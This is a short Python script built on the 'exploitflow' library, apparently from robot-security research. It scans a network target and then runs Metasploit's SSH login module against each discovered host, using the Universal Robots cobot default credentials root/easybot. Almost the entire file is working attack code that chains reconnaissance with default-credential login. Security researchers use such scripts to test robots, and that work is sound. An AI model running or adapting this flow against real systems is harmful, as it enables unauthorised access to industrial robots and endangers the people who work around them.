# Copyright 2022 VÃ­ctor Mayoral-Vilches. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# A exploit flow that footprints and sends attempts exploits a Universal Robots
# cobot with default credentials

import exploitflow as ef
# from exploitflow.state import State_v0

flow = ef.Flow()
init = ef.Init()

# nmap recon actions
recon = ef.Targets()
versions = ef.Versions(ports=ef.state.TARGET_PORTS_COMPLETE)


# # Build MSF reconnaissance exploit
# msf_options = {
#     "RHOSTS": "127.0.0.1"
# }
# recon = ef.adapter_msf_initializer.get_name("auxiliary", "scanner/discovery/arp_sweep")
# recon.set_options(msf_options)

# initialize state and pass it over a recon action
# resulting flow should deliver a state annotated
# with the results from the reconnaissance step

# state = flow.run(init * recon * versions, target=robot_target)  # NOTE: fetch versions as well
state = flow.run(init * recon, target="192.168.1.10")
for s in state.states.keys():
    print("Exploiting attempt of: ", s)

    # Build MSF ssh test exploit
    msf_options = {
        "RHOSTS": s,
        "USERNAME": "root",
        "PASSWORD": "easybot"
    }
    expl = ef.adapter_msf_initializer.get_name("auxiliary", "scanner/ssh/ssh_login")
    expl.set_options(msf_options)

    if not expl.missing():
        state = flow.run(state * expl, target=s, debug=True)
# state = flow.run(state * expl, target=robot_target, debug=False)

print(state)

    # # ASCII-depict graph
    # print(flow.ascii())
